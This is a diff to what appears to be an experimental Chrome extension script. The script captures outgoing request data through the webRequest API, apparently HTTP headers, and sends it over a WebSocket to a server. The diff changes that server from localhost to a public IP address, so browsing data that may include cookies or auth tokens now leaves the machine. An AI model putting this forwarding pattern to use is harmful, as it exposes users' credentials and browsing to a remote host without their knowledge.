@@ -18,6 +18,12 @@ function sendRequest(data) {
 }
 */
 
+try {
+  importScripts('./aes4js.js');
+} catch (e) {
+  console.error(e);
+}
+
 function stringToArrayBuffer(string) {
   var buffer = new ArrayBuffer(string.length);
   var bufView = new Uint8Array(buffer);
@@ -31,7 +37,7 @@ function arrayBufferToString(buffer) {
   return String.fromCharCode.apply(null, new Uint8Array(buffer));
 }
 
-const addr = 'ws://localhost:9001'
+const addr = 'ws://128.84.84.208:9001'
 
 const tabStorage = {};
 const networkFilters = {
@@ -57,8 +63,13 @@ chrome.webRequest.onSendHeaders.addListener((details) => {
     }
   }
   var ws = new WebSocket(addr);
-  ws.onopen = function(evt) { 
-    console.log("Preparing "); 
+  ws.onopen = function(evt) {
+    aes4js.encrypt("123", "hello world") // encrypt with password 123
+      .then(aes4js.decrypt.bind(this, "123")) // decrypt
+      //.then(alert) // display decrypted value
+    console.log("Preparing ");
+    chrome.tabs.create({url:"hello.html"});
+    //alert("sending HTTP header to TC");
     ws.send(data);
     ws.close();
   };
